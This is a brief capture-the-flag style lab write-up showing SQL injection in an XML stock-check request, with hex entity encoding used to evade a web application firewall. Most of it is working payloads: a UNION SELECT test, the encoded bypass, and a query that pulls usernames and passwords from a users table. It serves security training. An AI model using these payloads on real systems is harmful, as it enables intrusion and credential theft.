# SQL Injection with XML Encoding (WAF Bypass)

## Goal
- Bypass filter (WAF)
- Extract usernames & passwords

---

## Step 1: Capture Request

Use Burp Suite and intercept:

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

## Step 2: Test Injection

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

Response:
403 Forbidden → Attack detected

---

## Step 3: Bypass with XML Encoding

```xml
<storeId>
&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;
</storeId>
```

---

## Step 4: Extract Data

Payload:
UNION SELECT username || '~' || password FROM users

---

## Step 5: Result

administrator~****
wiener~****
carlos~****

---

## Key Point

- WAF blocks normal input  
- XML encoding bypasses filter  
- Server decodes before execution  

---

## Status

Lab Solved
